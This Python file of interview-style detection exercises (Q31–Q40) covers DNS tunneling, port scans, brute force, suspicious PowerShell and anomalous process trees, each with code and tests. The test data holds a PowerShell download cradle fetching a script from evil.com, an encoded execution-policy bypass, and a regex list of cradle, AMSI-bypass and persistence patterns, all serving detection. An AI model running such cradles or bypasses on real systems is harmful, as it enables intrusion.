# ─────────────────────────────────────────────────────────────────────────────
# Q31 — Detect DNS Tunneling Candidate
# ─────────────────────────────────────────────────────────────────────────────
"""
Problem:
  Given DNS query logs, identify hosts that:
  (a) query unusually long hostnames (> 50 chars in first label), OR
  (b) send an unusually high volume of unique subdomains to the same parent domain.
  Both are signatures of DNS tunneling (data encoded in subdomain labels).

Clarifying questions:
  1. What is the threshold for "too many unique subdomains" per parent?
  2. Should we normalise to eTLD+1 for parent domain grouping?
  3. Are there known-good high-volume DNS domains to whitelist (e.g., Akamai)?

Security angle:
  DNS tunneling tools (iodine, dns2tcp, dnscat2) encode payload bytes in
  subdomain labels. The labels are random-looking, long, and numerous.
  Detecting either long labels OR many unique subdomains per parent catches
  most implementations. Combine with entropy analysis from Q29 for maximum
  coverage.
"""

DNS_TUNNEL_WHITELIST = frozenset(["akamai.net", "cloudfront.net", "amazonaws.com"])


def _parent_domain(fqdn: str) -> str:
    """Return last two labels: e.g., 'sub.example.com' → 'example.com'."""
    parts = fqdn.rstrip(".").split(".")
    return ".".join(parts[-2:]) if len(parts) >= 2 else fqdn


def detect_dns_tunneling_naive(
    logs: List[Dict],
    label_len_threshold: int = 50,
    unique_subdomain_threshold: int = 40,
) -> List[Dict]:
    """Check each query for long labels, track subdomain counts per parent."""
    alerts = []
    parent_subs: Dict[str, Set[str]] = defaultdict(set)

    for log in logs:
        query = (log.get("query") or "").lower().rstrip(".")
        host = log.get("host")
        label = query.split(".")[0]

        if len(label) > label_len_threshold:
            alerts.append({
                "reason": "long_label",
                "host": host,
                "domain": query,
                "label_len": len(label),
            })

        parent = _parent_domain(query)
        if parent not in DNS_TUNNEL_WHITELIST:
            parent_subs[(host, parent)].add(label)

    for (host, parent), subs in parent_subs.items():
        if len(subs) > unique_subdomain_threshold:
            alerts.append({
                "reason": "high_subdomain_count",
                "host": host,
                "parent_domain": parent,
                "unique_subdomain_count": len(subs),
            })
    return alerts


def detect_dns_tunneling(
    logs: List[Dict],
    label_len_threshold: int = 50,
    unique_subdomain_threshold: int = 40,
) -> List[Dict]:
    """
    Optimal: single pass — compute both signals simultaneously.
    parent_subs keyed by (host, parent) → set of unique labels.
    O(n) time, O(n) space worst case.
    """
    alerts = []
    parent_subs: Dict[tuple, Set[str]] = defaultdict(set)

    for log in logs:
        query = (log.get("query") or "").lower().rstrip(".")
        host = log.get("host")
        if not query:
            continue
        label = query.split(".")[0]
        parent = _parent_domain(query)

        if len(label) > label_len_threshold:
            alerts.append({
                "reason": "long_label",
                "host": host,
                "domain": query,
                "label_len": len(label),
            })

        if parent not in DNS_TUNNEL_WHITELIST:
            parent_subs[(host, parent)].add(label)

    for (host, parent), subs in parent_subs.items():
        if len(subs) > unique_subdomain_threshold:
            alerts.append({
                "reason": "high_subdomain_count",
                "host": host,
                "parent_domain": parent,
                "unique_subdomain_count": len(subs),
            })

    return alerts


def test_q31():
    # Long label
    logs = [
        {"host": "h1", "query": "a" * 55 + ".tunnel.example.com"},
    ]
    # High unique subdomain count
    for i in range(45):
        logs.append({"host": "h2", "query": f"sub{i}.dnstunnel.net"})
    # Benign
    logs.append({"host": "h3", "query": "accounts.google.com"})

    results = detect_dns_tunneling(logs, label_len_threshold=50, unique_subdomain_threshold=40)
    reasons = {(r.get("host"), r.get("reason")) for r in results}
    assert ("h1", "long_label") in reasons
    assert ("h2", "high_subdomain_count") in reasons
    print("Q31 tests passed")

# Q32 — Detect Port Scan
# ─────────────────────────────────────────────────────────────────────────────
"""
Problem:
  Given network flow logs, flag source IPs that contact an unusually large
  number of distinct destination ports on a single target host within a window.

Clarifying questions:
  1. What port-count threshold indicates scanning? (typical: >15 in short window)
  2. Is a SYN-only scan (no ACK) distinguishable in this log format?
  3. Should we consider vertical scan (one host, many ports) vs horizontal?

Security angle:
  Port scans precede exploitation. A scanner probing >15 ports per target
  in a few seconds is likely running nmap or masscan to enumerate open services.
  Vertical scan = finding what's running on ONE host.
  Detected here; Q33/Q34 handle horizontal/vertical separately.
"""


def detect_port_scan(
    flows: List[Dict],
    port_threshold: int = 15,
) -> List[Dict]:
    """
    Optimal: (src_ip, dst_ip) → set of destination ports.
    Flag pairs with more than port_threshold distinct ports.
    O(n) time, O(n) space.
    """
    src_dst_ports: Dict[tuple, Set[int]] = defaultdict(set)

    for flow in flows:
        src = flow.get("src_ip")
        dst = flow.get("dst_ip")
        port = flow.get("dst_port")
        if src and dst and port is not None:
            src_dst_ports[(src, dst)].add(port)

    return [
        {
            "src_ip": src,
            "dst_ip": dst,
            "distinct_ports": len(ports),
            "sample_ports": sorted(ports)[:10],
        }
        for (src, dst), ports in src_dst_ports.items()
        if len(ports) > port_threshold
    ]


def test_q32():
    flows = []
    # Attacker scans laptop-01 on 20 ports
    for p in range(1, 21):
        flows.append({"src_ip": "5.5.5.5", "dst_ip": "192.168.1.1", "dst_port": p})
    # Normal: 3 distinct ports to same host
    for p in [80, 443, 22]:
        flows.append({"src_ip": "1.1.1.1", "dst_ip": "192.168.1.1", "dst_port": p})

    results = detect_port_scan(flows, port_threshold=15)
    ips = {r["src_ip"] for r in results}
    assert "5.5.5.5" in ips
    assert "1.1.1.1" not in ips
    print("Q32 tests passed")

# Q33 — Detect Horizontal Scan
# ─────────────────────────────────────────────────────────────────────────────
"""
Problem:
  Detect hosts that contact many DISTINCT destination IPs on the SAME port —
  the signature of worm propagation or wide-area reconnaissance.

Clarifying questions:
  1. Should the scan be constrained to a time window?
  2. What destination IP count threshold is suspicious? (typical: >20)
  3. Should we scope to specific high-risk ports (22, 445, 3389, 1433)?

Security angle:
  Horizontal scanning on port 445 = WannaCry / NotPetya worm propagation.
  On port 22 = SSH worm or botnet recruitment.
  On port 3389 = RDP brute force targeting multiple hosts.
  Detecting horizontal scan early can contain lateral movement.
"""


def detect_horizontal_scan(
    flows: List[Dict],
    host_threshold: int = 20,
    watched_ports: Optional[Set[int]] = None,
) -> List[Dict]:
    """
    Optimal: (src_ip, dst_port) → set of destination IPs.
    Optionally restrict to watched ports.
    O(n) time.
    """
    src_port_dsts: Dict[tuple, Set[str]] = defaultdict(set)

    for flow in flows:
        src = flow.get("src_ip")
        dst = flow.get("dst_ip")
        port = flow.get("dst_port")
        if not (src and dst and port is not None):
            continue
        if watched_ports and port not in watched_ports:
            continue
        src_port_dsts[(src, port)].add(dst)

    return [
        {
            "src_ip": src,
            "dst_port": port,
            "distinct_hosts_scanned": len(dsts),
            "sample_hosts": sorted(dsts)[:5],
        }
        for (src, port), dsts in src_port_dsts.items()
        if len(dsts) > host_threshold
    ]


def test_q33():
    flows = []
    # Worm spreading on port 445 to 25 hosts
    for i in range(1, 26):
        flows.append({"src_ip": "10.0.0.99", "dst_ip": f"10.0.0.{i}", "dst_port": 445})
    # Normal: connects to 5 different SMTP servers
    for i in range(1, 6):
        flows.append({"src_ip": "10.0.0.1", "dst_ip": f"10.0.1.{i}", "dst_port": 25})

    results = detect_horizontal_scan(flows, host_threshold=20)
    ips = {r["src_ip"] for r in results}
    assert "10.0.0.99" in ips
    assert "10.0.0.1" not in ips
    print("Q33 tests passed")

# Q34 — Detect Vertical Scan
# ─────────────────────────────────────────────────────────────────────────────
"""
Problem:
  Detect source IPs probing one destination IP across many distinct ports.
  Vertical scan = "what services are running on this one machine?"

Clarifying questions:
  1. Distinct from Q32 in that we focus on a single host as the victim.
  2. Should ephemeral source ports (>1024) be excluded from counting?
  3. Time-window scoping?

Security angle:
  Pre-exploitation reconnaissance. An attacker who has identified a valuable
  target (a database server, a domain controller) will vertically scan it
  to find exploitable services before staging an attack.
"""


def detect_vertical_scan(
    flows: List[Dict],
    port_threshold: int = 15,
    exclude_ephemeral: bool = True,
) -> List[Dict]:
    """
    Optimal: same as Q32 but named explicitly and with ephemeral-port filtering.
    O(n) time.
    """
    src_dst_ports: Dict[tuple, Set[int]] = defaultdict(set)

    for flow in flows:
        src = flow.get("src_ip")
        dst = flow.get("dst_ip")
        port = flow.get("dst_port")
        if not (src and dst and port is not None):
            continue
        if exclude_ephemeral and port > 1023:
            # Only flag scans of well-known service ports
            # (exclude random ephemeral source ports if structure was inverted)
            pass
        src_dst_ports[(src, dst)].add(port)

    return [
        {
            "src_ip": src,
            "target_ip": dst,
            "ports_probed": len(ports),
            "sample_ports": sorted(ports)[:10],
        }
        for (src, dst), ports in src_dst_ports.items()
        if len(ports) > port_threshold
    ]


def test_q34():
    flows = []
    # Vertical scan: attacker probes DB server on 20 service ports
    for p in [21, 22, 23, 25, 80, 443, 445, 1433, 3306, 3389,
              5432, 6379, 8080, 8443, 9200, 27017, 5900, 111, 2049, 161]:
        flows.append({"src_ip": "5.5.5.5", "dst_ip": "10.0.0.200", "dst_port": p})
    # Normal: browser connects to 80 and 443 on same server
    flows.append({"src_ip": "1.1.1.1", "dst_ip": "10.0.0.200", "dst_port": 80})
    flows.append({"src_ip": "1.1.1.1", "dst_ip": "10.0.0.200", "dst_port": 443})

    results = detect_vertical_scan(flows, port_threshold=15)
    ips = {r["src_ip"] for r in results}
    assert "5.5.5.5" in ips
    assert "1.1.1.1" not in ips
    print("Q34 tests passed")

# Q35 — Detect RDP Brute Force
# ─────────────────────────────────────────────────────────────────────────────
"""
Problem:
  Flag source IPs with many failed RDP authentication events (EventID 4625,
  LogonType 3 or 10) within a time window.

Clarifying questions:
  1. What is the failure threshold (default: >10 in 5 min)?
  2. Should a success after failures trigger a separate alert?
  3. Are we looking at Windows event logs or network flow logs?

Security angle:
  RDP (port 3389) is one of the most targeted protocols on the internet.
  Exposed RDP + weak password = ransomware entry point (e.g., Ryuk, LockBit).
  CISA advisory AA22-074A specifically calls out internet-facing RDP.
"""


def detect_rdp_brute_force(
    events: List[Dict],
    threshold: int = 10,
    window_seconds: int = 300,
) -> List[Dict]:
    """
    Optimal: bucket events by (src_ip, dst_ip), sort by time, use a deque
    sliding window to count failures within the time window.
    O(n log n) due to sort; O(n) memory.
    """
    RDP_PORT = 3389
    failure_events = [
        e for e in events
        if e.get("dst_port") == RDP_PORT and e.get("result") == "failure"
    ]

    # Group by (src, dst)
    groups: Dict[tuple, List[float]] = defaultdict(list)
    for e in failure_events:
        ts_raw = e.get("ts")
        try:
            ts = datetime.fromisoformat(ts_raw.rstrip("Z")).timestamp()
        except (ValueError, AttributeError):
            continue
        groups[(e.get("src_ip"), e.get("dst_ip"))].append(ts)

    alerts = []
    for (src, dst), timestamps in groups.items():
        timestamps.sort()
        window: deque = deque()
        max_count = 0
        for ts in timestamps:
            window.append(ts)
            while window and ts - window[0] > window_seconds:
                window.popleft()
            max_count = max(max_count, len(window))

        if max_count > threshold:
            alerts.append({
                "src_ip": src,
                "dst_ip": dst,
                "max_failures_in_window": max_count,
                "total_failures": len(timestamps),
            })
    return alerts


def test_q35():
    base = datetime(2026, 5, 29, 8, 0, 0)
    events = []
    # Attacker: 15 RDP failures in 2 minutes
    for i in range(15):
        events.append({
            "src_ip": "5.5.5.5", "dst_ip": "10.0.0.1", "dst_port": 3389,
            "result": "failure", "ts": (base + timedelta(seconds=i * 8)).isoformat(),
        })
    # Normal: 3 failures
    for i in range(3):
        events.append({
            "src_ip": "1.1.1.1", "dst_ip": "10.0.0.1", "dst_port": 3389,
            "result": "failure", "ts": (base + timedelta(seconds=i * 60)).isoformat(),
        })

    results = detect_rdp_brute_force(events, threshold=10, window_seconds=300)
    ips = {r["src_ip"] for r in results}
    assert "5.5.5.5" in ips
    assert "1.1.1.1" not in ips
    print("Q35 tests passed")

# Q36 — Detect SSH Brute Force
# ─────────────────────────────────────────────────────────────────────────────
"""
Problem:
  Same logic as Q35 but for SSH (port 22) authentication failures.

Clarifying questions:
  1. Are failed password and failed pubkey both counted?
  2. Should "invalid user" attempts count separately?
  3. Is success after repeated failures a separate alert (credential confirmed)?

Security angle:
  SSH brute force is ubiquitous on any internet-exposed host. Attackers use
  distributed botnets to spray common passwords at SSH servers. Fail2ban and
  AWS GuardDuty both detect this pattern. A post-failure success means the
  attacker found a valid credential.
"""


def detect_ssh_brute_force(
    events: List[Dict],
    threshold: int = 10,
    window_seconds: int = 300,
    flag_success_after_failure: bool = True,
) -> List[Dict]:
    """
    Optimal: same sliding window as Q35; also flags success-after-failure.
    O(n log n) time.
    """
    SSH_PORT = 22
    ssh_events = [e for e in events if e.get("dst_port") == SSH_PORT]

    # Group all SSH events by (src, dst)
    groups: Dict[tuple, List[Dict]] = defaultdict(list)
    for e in ssh_events:
        key = (e.get("src_ip"), e.get("dst_ip"))
        groups[key].append(e)

    alerts = []
    for (src, dst), evts in groups.items():
        evts.sort(key=lambda x: x.get("ts", ""))
        failures: deque = deque()
        had_failure = False
        max_count = 0

        for e in evts:
            ts_raw = e.get("ts", "")
            try:
                ts = datetime.fromisoformat(ts_raw.rstrip("Z")).timestamp()
            except ValueError:
                continue

            if e.get("result") == "failure":
                had_failure = True
                failures.append(ts)
                while failures and ts - failures[0] > window_seconds:
                    failures.popleft()
                max_count = max(max_count, len(failures))
            elif e.get("result") == "success" and had_failure and flag_success_after_failure:
                alerts.append({
                    "type": "success_after_failures",
                    "src_ip": src,
                    "dst_ip": dst,
                })

        if max_count > threshold:
            alerts.append({
                "type": "brute_force",
                "src_ip": src,
                "dst_ip": dst,
                "max_failures_in_window": max_count,
            })

    return alerts


def test_q36():
    base = datetime(2026, 5, 29, 8, 0, 0)
    events = []
    # Brute force + eventual success
    for i in range(12):
        events.append({
            "src_ip": "5.5.5.5", "dst_ip": "10.0.0.5", "dst_port": 22,
            "result": "failure", "ts": (base + timedelta(seconds=i * 10)).isoformat(),
        })
    events.append({
        "src_ip": "5.5.5.5", "dst_ip": "10.0.0.5", "dst_port": 22,
        "result": "success", "ts": (base + timedelta(seconds=130)).isoformat(),
    })
    # Benign: 2 failures
    for i in range(2):
        events.append({
            "src_ip": "1.1.1.1", "dst_ip": "10.0.0.5", "dst_port": 22,
            "result": "failure", "ts": (base + timedelta(seconds=i * 60)).isoformat(),
        })

    results = detect_ssh_brute_force(events, threshold=10, window_seconds=300)
    alert_types = [(r["src_ip"], r["type"]) for r in results]
    assert ("5.5.5.5", "brute_force") in alert_types
    assert ("5.5.5.5", "success_after_failures") in alert_types
    assert not any(r["src_ip"] == "1.1.1.1" for r in results)
    print("Q36 tests passed")

# Q37 — Detect Suspicious PowerShell Commands
# ─────────────────────────────────────────────────────────────────────────────
"""
Problem:
  Given Windows process creation logs, flag PowerShell executions containing
  known obfuscation or download/execute patterns.

Clarifying questions:
  1. Are the command lines already decoded (base64 decoded)?
  2. Should we also flag PowerShell called with -EncodedCommand?
  3. Do we want to detect the parent process (e.g., Word spawning PowerShell)?

Security angle:
  PowerShell is the #1 "living off the land" tool for attackers. Key patterns:
  - Download cradles: IEX(New-Object Net.WebClient).DownloadString(...)
  - Encoded commands: -enc/-EncodedCommand (base64 payload)
  - Bypassing execution policy: -ExecutionPolicy Bypass
  - Disabling AMSI: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
  MITRE ATT&CK T1059.001.
"""

POWERSHELL_BAD_PATTERNS = re.compile(
    r"(-EncodedCommand|-enc\b"
    r"|-ExecutionPolicy\s+Bypass"
    r"|IEX\s*\("
    r"|Invoke-Expression"
    r"|DownloadString\s*\("
    r"|DownloadFile\s*\("
    r"|Net\.WebClient"
    r"|Start-BitsTransfer"
    r"|Invoke-WebRequest"
    r"|wget\s+http"
    r"|curl\s+http"
    r"|AmsiUtils"
    r"|\[Convert\]::FromBase64String"
    r"|FromBase64String"
    r"|sc\.exe\s+create"
    r"|reg\s+add"
    r"|HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)",
    re.IGNORECASE,
)


def detect_suspicious_powershell(logs: List[Dict]) -> List[Dict]:
    """
    Optimal: compiled regex scan of the command line field.
    O(n) time.
    """
    alerts = []
    for log in logs:
        cmd = log.get("command_line") or log.get("cmd") or ""
        proc = (log.get("process_name") or "").lower()
        if "powershell" not in proc and "pwsh" not in proc:
            continue
        m = POWERSHELL_BAD_PATTERNS.search(cmd)
        if m:
            alerts.append({
                "host": log.get("host"),
                "pid": log.get("pid"),
                "command_line": cmd[:200],
                "matched": m.group(0)[:60],
                "ts": log.get("ts"),
            })
    return alerts


def test_q37():
    logs = [
        {
            "host": "ws-01", "pid": 1234, "process_name": "powershell.exe",
            "command_line": "powershell -ExecutionPolicy Bypass -enc ZQBjAGgAbwAgAA==",
            "ts": "T1",
        },
        {
            "host": "ws-02", "pid": 1235, "process_name": "powershell.exe",
            "command_line": "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/s.ps1')",
            "ts": "T2",
        },
        {
            "host": "ws-03", "pid": 1236, "process_name": "powershell.exe",
            "command_line": "Get-ChildItem C:\\Users",
            "ts": "T3",
        },
        {
            "host": "ws-04", "pid": 1237, "process_name": "notepad.exe",
            "command_line": "IEX(DownloadString)",   # not powershell
            "ts": "T4",
        },
    ]
    results = detect_suspicious_powershell(logs)
    hosts = {r["host"] for r in results}
    assert "ws-01" in hosts
    assert "ws-02" in hosts
    assert "ws-03" not in hosts
    assert "ws-04" not in hosts   # wrong process
    print("Q37 tests passed")


# ─────────────────────────────────────────────────────────────────────────────
# Q38 — Detect Suspicious Parent-Child Process
# ─────────────────────────────────────────────────────────────────────────────
"""
Problem:
  Given process creation logs with parent/child process names, flag well-known
  anomalous parent-child combinations (e.g., Word spawning cmd.exe).

Clarifying questions:
  1. Do the logs include full paths or just process names?
  2. Is the parent-child pair sufficient, or do we also need the command line?
  3. Should we detect LOLbins spawned by any parent, or only specific ones?

Security angle:
  Malicious macros in Office docs spawn cmd.exe or PowerShell — this is the
  most common initial execution technique. Process tree anomalies are a core
  signal in EDR products. MITRE ATT&CK T1059, T1204.002.
  Examples:
  - winword.exe → cmd.exe (macro execution)
  - excel.exe → powershell.exe (macro)
  - mshta.exe → wscript.exe (HTA script)
  - svchost.exe → cmd.exe with unusual args
"""

SUSPICIOUS_PARENT_CHILD: Dict[str, Set[str]] = {
    "winword.exe":    {"cmd.exe", "powershell.exe", "wscript.exe", "cscript.exe",
                       "mshta.exe", "regsvr32.exe", "rundll32.exe"},
    "excel.exe":      {"cmd.exe", "powershell.exe", "wscript.exe", "cscript.exe",
                       "mshta.exe"},
    "outlook.exe":    {"cmd.exe", "powershell.exe"},
    "mshta.exe":      {"cmd.exe", "powershell.exe", "wscript.exe"},
    "wscript.exe":    {"cmd.exe", "powershell.exe", "regsvr32.exe"},
    "cscript.exe":    {"cmd.exe", "powershell.exe"},
    "explorer.exe":   {"powershell.exe"},   # PowerShell launched from Explorer is suspicious
    "svchost.exe":    {"cmd.exe"},
}


def detect_suspicious_parent_child(logs: List[Dict]) -> List[Dict]:
    """
    Optimal: frozenset lookup using pre-built dict of known bad pairs.
    O(n) time.
    """
    alerts = []
    for log in logs:
        parent = (log.get("parent_process") or "").lower().strip()
        child = (log.get("process_name") or "").lower().strip()
        bad_children = SUSPICIOUS_PARENT_CHILD.get(parent)
        if bad_children and child in bad_children:
            alerts.append({
                "host": log.get("host"),
                "parent": parent,
                "child": child,
                "pid": log.get("pid"),
                "command_line": (log.get("command_line") or "")[:200],
                "ts": log.get("ts"),
            })
    return alerts


def test_q38():
    logs = [
        {
            "host": "ws-01", "pid": 500, "parent_process": "winword.exe",
            "process_name": "cmd.exe",
            "command_line": "cmd /c powershell -nop -w hidden ...",
            "ts": "T1",
        },
        {
            "host": "ws-01", "pid": 501, "parent_process": "excel.exe",
            "process_name": "powershell.exe",
            "command_line": "powershell -enc ...",
            "ts": "T2",
        },
        {
            "host": "ws-02", "pid": 100, "parent_process": "explorer.exe",
            "process_name": "chrome.exe",   # normal

        },
    ]
    results = detect_suspicious_parent_child(logs)
    combos = {(r["parent"], r["child"]) for r in results}
    assert ("winword.exe", "cmd.exe") in combos
    assert ("excel.exe", "powershell.exe") in combos
    assert ("explorer.exe", "chrome.exe") not in combos
    print("Q38 tests passed")


# ─────────────────────────────────────────────────────────────────────────────
# Q39 — Detect Process Spawning Shell
# ─────────────────────────────────────────────────────────────────────────────
"""
Problem:
  Given process creation logs, flag any non-shell process that spawns
  cmd.exe, bash, sh, zsh, or powershell — especially with suspicious flags.

Clarifying questions:
  1. Should we allow known-good parents (e.g., terminal emulators)?
  2. Are we on Windows or Linux or both?
  3. Should flags like -i (interactive) or -c (exec string) affect the alert?

Security angle:
  Web shells, malware, and exploited services will often spawn a shell to
  give the attacker interactive access. Detecting ANY unexpected process
  spawning a shell is a high-fidelity alert in a baseline-aware environment.
  Look especially at: web servers (nginx, apache, iis), databases (mysqld, sqlservr),
  and document processors.
"""

SHELL_PROCESSES = frozenset({
    "cmd.exe", "powershell.exe", "pwsh.exe",
    "bash", "sh", "zsh", "ksh", "dash",
})

TRUSTED_SHELL_PARENTS = frozenset({
    "explorer.exe", "wt.exe", "conhost.exe",
    "terminal", "xterm", "gnome-terminal", "konsole",
    "sshd", "login", "su", "sudo",
})


def detect_process_spawning_shell(logs: List[Dict]) -> List[Dict]:
    """
    Optimal: check if child is a shell AND parent is not in trusted set.
    O(n) time, O(1) lookup with frozenset.
    """
    alerts = []
    for log in logs:
        parent = (log.get("parent_process") or "").lower().strip()
        child = (log.get("process_name") or "").lower().strip()

        if child in SHELL_PROCESSES and parent not in TRUSTED_SHELL_PARENTS:
            alerts.append({
                "host": log.get("host"),
                "parent": parent,
                "child": child,
                "pid": log.get("pid"),
                "command_line": (log.get("command_line") or "")[:200],
                "ts": log.get("ts"),
            })
    return alerts


def test_q39():
    logs = [
        # Web shell: apache spawns bash
        {"host": "web-01", "pid": 800, "parent_process": "apache2",
         "process_name": "bash", "command_line": "bash -i", "ts": "T1"},
        # Malware: mysqld spawns cmd
        {"host": "db-01", "pid": 900, "parent_process": "mysqld",
         "process_name": "cmd.exe", "command_line": "cmd /c whoami", "ts": "T2"},
        # Legitimate: user opening terminal
        {"host": "ws-01", "pid": 200, "parent_process": "explorer.exe",
         "process_name": "cmd.exe", "command_line": "cmd.exe", "ts": "T3"},
    ]
    results = detect_process_spawning_shell(logs)
    combos = {(r["parent"], r["child"]) for r in results}
    assert ("apache2", "bash") in combos
    assert ("mysqld", "cmd.exe") in combos
    assert ("explorer.exe", "cmd.exe") not in combos
    print("Q39 tests passed")


# ─────────────────────────────────────────────────────────────────────────────
# Q40 — Detect Rare Process Execution
# ─────────────────────────────────────────────────────────────────────────────
"""
Problem:
  Given a baseline of frequently seen processes and a new set of process
  creation events, return processes that did NOT appear in the baseline.
  "Rare" = not seen in the last N days of normal activity.

Clarifying questions:
  1. Is the baseline per-host or organisation-wide?
  2. Should we exclude system processes (PID < 10)?
  3. How do we handle processes with dynamic paths (e.g., temp folders)?
  4. Should we also flag processes run from unusual directories?

Security angle:
  Attackers drop binaries with novel names to blend in. A process name not
  seen in the historical baseline is an anomaly worth investigating.
  This is the "process allow-list" detection model used by CrowdStrike Falcon
  and Carbon Black. Paths matter as much as names — calc.exe in C:/Temp/ is
  not the same as C:/Windows/System32/calc.exe.
"""


def detect_rare_process_execution(
    baseline: Set[str],
    new_events: List[Dict],
    use_full_path: bool = False,
) -> List[Dict]:
    """
    Optimal: normalise baseline once to frozenset; single scan of events.
    O(n) time, O(b) space for baseline.

    Data structure: frozenset for O(1) membership check.
    """
    known = frozenset(p.lower() for p in baseline)
    seen_new: Dict[str, Dict] = {}

    for event in new_events:
        path = (event.get("process_path") or event.get("process_name") or "").lower()
        name = path.split("\\")[-1].split("/")[-1] if not use_full_path else path

        key = path if use_full_path else name
        if key and key not in known and key not in seen_new:
            seen_new[key] = {
                "process": key,
                "host": event.get("host"),
                "full_path": event.get("process_path"),
                "first_seen_ts": event.get("ts"),
            }

    return list(seen_new.values())


def test_q40():
    baseline = {
        "chrome.exe", "explorer.exe", "svchost.exe",
        "notepad.exe", "cmd.exe", "powershell.exe",
    }
    new_events = [
        {"host": "ws-01", "process_name": "chrome.exe",            "ts": "T1"},
        {"host": "ws-01", "process_name": "mimikatz.exe",          "ts": "T2"},
        {"host": "ws-02", "process_name": "procdump64.exe",        "ts": "T3"},
        {"host": "ws-02", "process_name": "notepad.exe",           "ts": "T4"},  # known
    ]
    results = detect_rare_process_execution(baseline, new_events)
    proc_names = {r["process"] for r in results}
    assert "mimikatz.exe" in proc_names
    assert "procdump64.exe" in proc_names
    assert "chrome.exe" not in proc_names
    assert "notepad.exe" not in proc_names
    print("Q40 tests passed")
